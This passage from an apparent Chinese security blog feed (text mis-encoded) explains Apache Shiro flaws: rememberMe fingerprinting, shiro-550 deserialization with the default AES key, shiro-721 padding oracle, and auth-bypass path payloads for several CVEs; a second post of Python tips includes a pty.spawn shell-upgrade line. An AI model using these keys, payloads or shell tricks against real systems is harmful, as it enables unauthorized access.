        <content type="html"><![CDATA[<h2 id="Shiroæ¦‚è¿°"><a href="#Shiroæ¦‚è¿°" class="headerlink" title="Shiroæ¦‚è¿°"></a>Shiroæ¦‚è¿°</h2><p>â€‹Apache Shiroæ˜¯ä¸€ä¸ªå¼€æº<strong>å®‰å…¨æ¡†æ¶</strong>ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚</p><p>â€‹é€šå¸¸ä¸tomcatä¸€èµ·ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥æ›¿æ¢spring securityé›†æˆåˆ°springä¸­ï¼ˆå¦‚è‹¥ä¾ï¼‰ã€‚</p><h2 id="æ¡†æ¶ç‰¹å¾"><a href="#æ¡†æ¶ç‰¹å¾" class="headerlink" title="æ¡†æ¶ç‰¹å¾"></a>æ¡†æ¶ç‰¹å¾</h2><p>åœ¨è¯·æ±‚åŒ…çš„Cookieä¸­æœ‰rememberMeå­—æ®µèµ‹ä»»æ„å€¼ï¼Œæ”¶åˆ°è¿”å›åŒ…çš„ Set-Cookie ä¸­å­˜åœ¨?rememberMe&#x3D;deleteMe?å­—æ®µï¼Œè¯´æ˜ç›®æ ‡æœ‰ä½¿ç”¨Shiroæ¡†æ¶</p><p><img src="/../images/image-20230623161016099.png" alt="image-20230623161016099"></p><h2 id="shiroæ¼æ´"><a href="#shiroæ¼æ´" class="headerlink" title="shiroæ¼æ´"></a>shiroæ¼æ´</h2><p><img src="/../images/49e8911f-6936-4429-8213-5d369fafd193.png-w331s" alt="img"></p><h3 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h3><p>â€‹Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚</p><p>åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼çš„å¤„ç†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RememberMe Cookieå€¼ =&gt; base64è§£ç  =&gt; AESè§£å¯† =&gt; ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure><p>å¦‚æœçŸ¥é“<code>AES</code>çš„å¯†é’¥å°±å¯ä»¥æ„é€ æ¶æ„<code>cookie</code>ï¼Œä»è€Œé€ æˆååºåˆ—åŒ–RCEæ¼æ´ã€‚æ‰€ä»¥è¿™ä¹Ÿæ˜¯shiroååºåˆ—åŒ–ç»ä¹…ä¸è¡°çš„åŸå› ã€‚</p><p>payloadç”Ÿæˆ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">æ¶æ„ç±» =&gt; åºåˆ—åŒ– =&gt; AESåŠ å¯† =&gt; base64ç¼–ç </span><br></pre></td></tr></table></figure><h4 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h4><p>â€‹Apache Shiro 1.2.5ä¹‹å‰çš„ç‰ˆæœ¬åœ¨<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>ä¸­å­˜åœ¨AESé»˜è®¤ç§˜é’¥<code>kPH+bIxk5D2deZiIxcaaaA==</code>ã€‚</p><p>â€‹åœ¨ä¹‹åçš„ç‰ˆæœ¬ï¼Œå¯†é’¥ä¸ºéšæœºç”Ÿæˆçš„ã€‚</p><h4 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h4><p>â€‹Apache Shiro 1.4.2ä¹‹å‰çš„ç‰ˆæœ¬é»˜è®¤ä½¿ç”¨AES&#x2F;CBC&#x2F;PKCS5Paddingæ¨¡å¼åŠ å¯†ï¼Œè¯¥åŠ å¯†æ¨¡å¼å­˜åœ¨ç¼ºé™·ï¼Œå½“æ”»å‡»è€…è·å¾—ä¸€ä¸ªæœ‰æ•ˆçš„rememberMe Cookieå€¼æ—¶ï¼Œå¯ä»¥é€šè¿‡Padding Oracle Attackæ„é€ æœ‰æ•ˆçš„æ¶æ„åºåˆ—åŒ–æ•°æ®æ¥å‘èµ·æ”»å‡»ã€‚</p><p>â€‹åœ¨ä¹‹åçš„ç‰ˆæœ¬åŠ å¯†æ¨¡å¼ AES-CBCè¢«æ›´æ¢ä¸º AES-GCMï¼Œåœ¨ä½¿ç”¨å·¥å…·ç­‰æ—¶éœ€è¦æ³¨æ„è¯¥åŠ å¯†æ¨¡å¼çš„å˜åŒ–ã€‚</p><h4 id="å¯†é’¥è·å–"><a href="#å¯†é’¥è·å–" class="headerlink" title="å¯†é’¥è·å–"></a>å¯†é’¥è·å–</h4><ul><li><p>ä»»æ„æ–‡ä»¶è¯»å–&#x2F;ä¸‹è½½</p></li><li><p>çˆ†ç ´</p><p>From <a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a></p><p>ä½¿ç”¨ä¸€ä¸ªç©ºçš„ <code>SimplePrincipalCollection</code>ä½œä¸º payloadï¼Œåºåˆ—åŒ–åä½¿ç”¨å¾…æ£€æµ‹çš„ç§˜é’¥è¿›è¡ŒåŠ å¯†å¹¶å‘é€ï¼Œå½“å¯†é’¥æ­£ç¡®æ—¶ä¸è¿”å›<strong>deleteMe</strong> ï¼Œå¯†é’¥é”™è¯¯æ—¶è¿”å› <strong>deleteMe</strong> ã€‚</p><p>è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œå¦‚æœç§˜é’¥æ­£ç¡®è¿”å›çš„æ˜¯ä¸€ä¸ª <code>deleteMe</code>ï¼Œå¯†é’¥é”™è¯¯è¿”å›çš„æ˜¯ä¸¤ä¸ª <code>deleteMe</code>ã€‚</p></li></ul><h4 id="å¸¸è§é™åˆ¶"><a href="#å¸¸è§é™åˆ¶" class="headerlink" title="å¸¸è§é™åˆ¶"></a>å¸¸è§é™åˆ¶</h4><ul><li><p>Tomcat Header çš„å¤§å°é™åˆ¶ 8kb</p><p><a href="https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/">https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/</a></p></li><li><p>remember meç‰¹å¾è¢«ä¿®æ”¹ </p></li><li><p>ååºåˆ—åŒ–é“¾</p><p>ç”±äºShiroé‡å†™äº†resolveClassæ–¹æ³•ï¼Œå°†åŸç”Ÿæ–¹æ³•ä¸­çš„forNameæ–¹æ³•æ›¿æ¢ä¸ºloadClassæ–¹æ³•ï¼Œç”±äºloadClassæ— æ³•åŠ è½½æ•°ç»„ç±»å‹çš„ç±»ï¼Œå› æ­¤å­˜åœ¨Transformer[]ç±»çš„CommonCollections gadgetæ— æ³•æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´ï¼Œï¼ˆä¾‹å¦‚ysoserial CommonCollections1ã€CommonCollections3ï¼‰</p><p>æ€è·¯ï¼š</p></li></ul><p><img src="/../images/1645693858000-8awcri.png-w331s" alt="image-20220221183250833"></p><p><strong>shiroé»˜è®¤æ˜¯æ²¡æœ‰ccä¾èµ–çš„ï¼Œä½†æ˜¯å­˜åœ¨commons-beanutils 1.8.3ä¾èµ–</strong></p><h3 id="èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´"><a href="#èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´" class="headerlink" title="èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´"></a>èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´</h3><table><thead><tr><th align="center">ç¼–å·</th><th align="center">ç‰ˆæœ¬å½±å“</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">CVE-2023-22602</td><td align="center">Apache Shiro &lt; 1.11.0ï¼ŒSpring Boot&gt;&#x3D;2.6</td><td align="center">&#x2F;admin&#x2F;..</td></tr><tr><td align="center">CVE-2022-32532</td><td align="center">Shiro &lt; 1.9.1</td><td align="center">&#x2F;admin&#x2F;%0dï¼Œ&#x2F;admin&#x2F;%0a</td></tr><tr><td align="center">CVE-2022-40664</td><td align="center">Shiro &lt; 1.10.0</td><td align="center">åœ¨è¿›è¡Œè¯·æ±‚è½¬å‘æˆ–åŒ…å«æ—¶ä¸ä¼šè¿›è¡Œé‰´æƒï¼Œå¯¼è‡´ç»•è¿‡</td></tr></tbody></table><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://paper.seebug.org/1378/">Shiro ç»„ä»¶æ¼æ´ä¸æ”»å‡»é“¾åˆ†æ</a></p><p><a href="https://paper.seebug.org/1285/">Shiro RememberMe æ¼æ´æ£€æµ‹çš„æ¢ç´¢ä¹‹è·¯</a></p><p><a href="https://www.freebuf.com/vuls/362341.html">Shiro(å…¨ç³»æ¼æ´åˆ†æ-æˆªè‡³20230331) - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pythonæŠ€å·§</title>
      <link href="/2023/05/01/python%E6%8A%80%E5%B7%A7/"/>
      <url>/2023/05/01/python%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h3 id="è¾“å‡ºåˆ—è¡¨å…ƒç´ "><a href="#è¾“å‡ºåˆ—è¡¨å…ƒç´ " class="headerlink" title="è¾“å‡ºåˆ—è¡¨å…ƒç´ "></a>è¾“å‡ºåˆ—è¡¨å…ƒç´ </h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lis=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(lis[<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span>(*lis[<span class="number">1</span>:])</span><br><span class="line">&gt;&gt;</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="åŒæ—¶è·å¾—å…ƒç´ ä¸å…ƒç´ ç´¢å¼•"><a href="#åŒæ—¶è·å¾—å…ƒç´ ä¸å…ƒç´ ç´¢å¼•" class="headerlink" title="åŒæ—¶è·å¾—å…ƒç´ ä¸å…ƒç´ ç´¢å¼•"></a>åŒæ—¶è·å¾—å…ƒç´ ä¸å…ƒç´ ç´¢å¼•</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lis = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(lis):</span><br><span class="line"><span class="built_in">print</span>(index,i)</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">0</span> a</span><br><span class="line"><span class="number">1</span> b</span><br><span class="line"><span class="number">2</span> c</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²æ ¼å¼åŒ–"><a href="#å­—ç¬¦ä¸²æ ¼å¼åŒ–" class="headerlink" title="å­—ç¬¦ä¸²æ ¼å¼åŒ–"></a>å­—ç¬¦ä¸²æ ¼å¼åŒ–</h3><ul><li><p>ç±»ä¼¼cè¯­è¨€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># %s å­—ç¬¦ä¸²å ä½</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s&quot;</span>%<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line"><span class="comment"># %c å­—ç¬¦å ä½</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%c&quot;</span>%<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>format   (ä¼šè‡ªåŠ¨å°†å˜é‡è½¬ä¸ºstr)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure><blockquote><p>å ä½ç¬¦æ ¼å¼åŒ–<a href="https://blog.csdn.net/u014770372/article/details/76021988">https://blog.csdn.net/u014770372/article/details/76021988</a></p></blockquote></li></ul><h3 id="äº¤æ¢æ•°å€¼"><a href="#äº¤æ¢æ•°å€¼" class="headerlink" title="äº¤æ¢æ•°å€¼"></a>äº¤æ¢æ•°å€¼</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line">a,b=b,a</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line">&gt;&gt;<span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="æ¨å¯¼å¼"><a href="#æ¨å¯¼å¼" class="headerlink" title="æ¨å¯¼å¼"></a>æ¨å¯¼å¼</h3><blockquote><p>[æƒ³å¾—åˆ°çš„å˜é‡å½¢å¼ for å˜é‡ in å¯è¿­ä»£å¯¹è±¡ if æ¡ä»¶è¡¨è¾¾å¼]</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ‰¾å‡ºåˆ—è¡¨é‡Œå¤§äº0çš„æ•°</span></span><br><span class="line">shu=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,-<span class="number">1</span>,-<span class="number">2</span>,-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> shu <span class="keyword">if</span> i&gt;<span class="number">0</span>])</span><br><span class="line">&gt;&gt;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç»Ÿè®¡ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">m = <span class="string">&#x27;I am Khazking!&#x27;</span></span><br><span class="line">n = &#123;i:m.count(i) <span class="keyword">for</span> i <span class="keyword">in</span> m&#125;</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">&gt;&gt;&#123;<span class="string">&#x27;I&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27; &#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;m&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;K&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;k&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;i&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;n&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;g&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;!&#x27;</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²æ›¿æ¢"><a href="#å­—ç¬¦ä¸²æ›¿æ¢" class="headerlink" title="å­—ç¬¦ä¸²æ›¿æ¢"></a>å­—ç¬¦ä¸²æ›¿æ¢</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#repalceæ–¹æ³•åªèƒ½å®ç°å…ƒç´ ä¸€å¯¹ä¸€æ›¿æ¢</span></span><br><span class="line"><span class="comment">#ä½¿ç”¨ä¸‹è¿°æ–¹æ³•å¯ä»¥å®ç°bæ›¿æ¢ä¸ºz,zæ›¿æ¢ä¸ºb</span></span><br><span class="line"><span class="comment">#å»ºç«‹æ˜ å°„å…³ç³»å­—å…¸</span></span><br><span class="line">a=<span class="string">&#x27;zbbz&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span>.maketrans(<span class="string">&#x27;bz&#x27;</span>,<span class="string">&#x27;zb&#x27;</span>)<span class="comment">#ç­‰ä»·äº table= &#123;&#x27;b&#x27;:&#x27;z&#x27;,&#x27;z&#x27;:&#x27;b&#x27;&#125;</span></span><br><span class="line">a = a.translate(table)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt;bzzb</span><br></pre></td></tr></table></figure><h3 id="å„ç§æ’åº"><a href="#å„ç§æ’åº" class="headerlink" title="å„ç§æ’åº"></a>å„ç§æ’åº</h3><p><code>reverse=True</code>é™åºï¼Œé»˜è®¤ä¸ºå‡åº</p><ul><li><p>å­—å…¸æ’åº</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŒ‰é”®å€¼æ’åº</span></span><br><span class="line"><span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># æŒ‰é”®åæ’åº</span></span><br><span class="line"><span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">0</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li><li><p>åµŒå¥—æ’åº</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å­—å…¸åµŒå¥—</span></span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">3</span>], <span class="string">&#x27;c&#x27;</span>: [<span class="number">3</span>, <span class="number">4</span>], <span class="string">&#x27;b&#x27;</span>: [<span class="number">0</span>, <span class="number">2</span>], <span class="string">&#x27;d&#x27;</span>: [<span class="number">2</span>, <span class="number">1</span>]&#125;</span><br><span class="line"><span class="built_in">sorted</span>(dic.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>][<span class="number">1</span>], reverse=<span class="literal">True</span>) <span class="comment"># æŒ‰é”®å€¼ï¼ˆåˆ—è¡¨ï¼‰çš„ç¬¬äºŒä¸ªå…ƒç´ æ’åˆ—</span></span><br><span class="line"><span class="comment"># åˆ—è¡¨åµŒå¥—</span></span><br><span class="line">[[<span class="string">&#x27;é‡‘ç‰›&#x27;</span>, <span class="number">89000</span>, <span class="number">13140.196950444726</span>, <span class="number">2800</span>, <span class="number">1574</span>], [<span class="string">&#x27;é”¦æ±Ÿ&#x27;</span>, <span class="number">113800</span>, <span class="number">18719.342387419587</span>, <span class="number">2550</span>, <span class="number">1399</span>], [<span class="string">&#x27;æˆå&#x27;</span>, <span class="number">96400</span>, <span class="number">14034.861538461539</span>, <span class="number">2300</span>, <span class="number">1300</span>], [<span class="string">&#x27;é«˜æ–°&#x27;</span>, <span class="number">160000</span>, </span><br><span class="line"><span class="number">23663.31254871395</span>, <span class="number">3600</span>, <span class="number">1283</span>], [<span class="string">&#x27;æ­¦ä¾¯&#x27;</span>, <span class="number">102000</span>, <span class="number">19768.739789964995</span>, <span class="number">3100</span>, <span class="number">857</span>]]</span><br><span class="line"><span class="built_in">sorted</span>(lis, key = <span class="keyword">lambda</span> k : k[<span class="number">2</span>],reverse= <span class="literal">True</span>) <span class="comment"># æŒ‰æ¯ä¸ªå­åˆ—è¡¨çš„ç¬¬ä¸‰ä¸ªå…ƒç´ æ’åˆ—</span></span><br></pre></td></tr></table></figure></li></ul><p>ä¿®æ”¹ä¸‹æ ‡å³å¯æŒ‰ç…§å…¶ä»–å…ƒç´ è¿›è¡Œæ’åˆ—ã€‚</p><h3 id="ç»Ÿè®¡å­—ç¬¦å‡ºç°çš„é¢‘ç‡"><a href="#ç»Ÿè®¡å­—ç¬¦å‡ºç°çš„é¢‘ç‡" class="headerlink" title="ç»Ÿè®¡å­—ç¬¦å‡ºç°çš„é¢‘ç‡"></a>ç»Ÿè®¡å­—ç¬¦å‡ºç°çš„é¢‘ç‡</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">data = [randint(<span class="number">0</span>,<span class="number">20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">dict</span>.fromkeys(data,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    s[i]+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># ç»Ÿè®¡å­—ç¬¦å‡ºç°æ¬¡æ•°</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#ç»Ÿè®¡sä¸­å‡ºç°é¢‘ç‡æœ€é«˜çš„ä¸‰ä¸ªæ•°</span></span><br><span class="line"><span class="built_in">print</span> (Counter(s).most_common(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><h3 id="ä»åºåˆ—ä¸­ç­›é€‰å‡ºç¬¦åˆæ¡ä»¶çš„å…ƒç´ "><a href="#ä»åºåˆ—ä¸­ç­›é€‰å‡ºç¬¦åˆæ¡ä»¶çš„å…ƒç´ " class="headerlink" title="ä»åºåˆ—ä¸­ç­›é€‰å‡ºç¬¦åˆæ¡ä»¶çš„å…ƒç´ "></a>ä»åºåˆ—ä¸­ç­›é€‰å‡ºç¬¦åˆæ¡ä»¶çš„å…ƒç´ </h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="comment">#filter(function, iterable)</span></span><br><span class="line">data = [randint(-<span class="number">10</span>,<span class="number">10</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:x&gt;=<span class="number">0</span>,data))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æˆ–è€…åˆ—è¡¨æ¨å¯¼å¼</span></span><br></pre></td></tr></table></figure><h3 id="ä¸´æ—¶æ–‡ä»¶"><a href="#ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶"></a>ä¸´æ—¶æ–‡ä»¶</h3><blockquote><p>æˆ‘ä»¬é‡‡é›†æ•°æ®è¿›è¡Œåˆ†æï¼Œä½†æ˜¯æˆ‘ä»¬åªéœ€è¦ä¿å­˜ç»“æœï¼Œæˆ‘ä»¬é‡‡é›†çš„æ•°æ®å¦‚æœå¸¸é©»å†…å­˜å°±ä¼šè®©ç”µè„‘å´©æºƒï¼Œäºæ˜¯æˆ‘ä»¬å°†è¿™ä¸ªæ•°æ®æ”¾åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­ï¼ˆå¤–éƒ¨å­˜å‚¨ï¼‰ï¼Œåœ¨æ–‡ä»¶å…³é—­åå°†è¢«åˆ é™¤</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tempfile <span class="keyword">import</span> TemporaryFile,NamedTemporaryFile</span><br><span class="line">f = TemporaryFile()</span><br><span class="line">f.write(<span class="string">b&#x27;abc&#x27;</span>*<span class="number">10000</span>)</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line">a=f.read(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªä¸´æ—¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œå¦‚æœæˆ‘ä»¬æƒ³åˆ›å»ºä¸€ä¸ªèƒ½åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çœ‹åˆ°çš„ä¸´æ—¶æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±ç”¨NamedTemporaryFile</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nte = NamedTemporaryFile(delete=false)<span class="comment">#deleteå‚æ•°ä¸ºfalseæ—¶ç¨‹åºè¿è¡Œå®Œï¼Œä¸´æ—¶æ–‡ä»¶ä¹Ÿä¸ä¼šè¢«åˆ é™¤</span></span><br><span class="line"><span class="built_in">print</span>(nte.name)</span><br></pre></td></tr></table></figure><h3 id="ç©·ä¸¾ç»„åˆ"><a href="#ç©·ä¸¾ç»„åˆ" class="headerlink" title="ç©·ä¸¾ç»„åˆ"></a>ç©·ä¸¾ç»„åˆ</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å…¨æ’åˆ—  </span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="comment">#permutations()è¿”å›çš„æ˜¯tupleç±»å‹ï¼Œæ‰€è¦è¦ç”¨&#x27;&#x27;.join(i)è¿æ¥èµ·æ¥</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> permutations(<span class="string">&#x27;123&#x27;</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(i),end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="æ¨¡æ‹Ÿç»ˆç«¯"><a href="#æ¨¡æ‹Ÿç»ˆç«¯" class="headerlink" title="æ¨¡æ‹Ÿç»ˆç«¯"></a>æ¨¡æ‹Ÿç»ˆç«¯</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pty;pty.spawn(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="äºŒè¿›åˆ¶æ–‡ä»¶åŸåœ°ä¿®æ”¹"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶åŸåœ°ä¿®æ”¹" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶åŸåœ°ä¿®æ”¹"></a>äºŒè¿›åˆ¶æ–‡ä»¶åŸåœ°ä¿®æ”¹</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">memory_map</span>(<span class="params">filename, access=mmap.ACCESS_WRITE</span>):</span><br><span class="line">    size = os.path.getsize(filename)</span><br><span class="line">    fd = os.<span class="built_in">open</span>(filename, os.O_RDWR)</span><br><span class="line">    <span class="keyword">return</span> mmap.mmap(fd, size, access=access)</span><br><span class="line">m = memory_map(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(m)</span><br><span class="line"><span class="number">1000000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line"><span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="è„šæœ¬å‚æ•°"><a href="#è„šæœ¬å‚æ•°" class="headerlink" title="è„šæœ¬å‚æ•°"></a>è„šæœ¬å‚æ•°</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python xx.py aa</span><br><span class="line"></span><br><span class="line">sys.argv[<span class="number">0</span>]â†’xx.py</span><br><span class="line">sys.argv[<span class="number">1</span>]â†’aa</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;target url&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--threads&quot;</span> , <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;threads num&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">&gt;&gt;</span><br><span class="line">python xx.py -u xx.com -t <span class="number">20</span></span><br><span class="line"></span><br><span class="line">args.url=xx.com</span><br><span class="line">args.threads=<span class="number">20</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
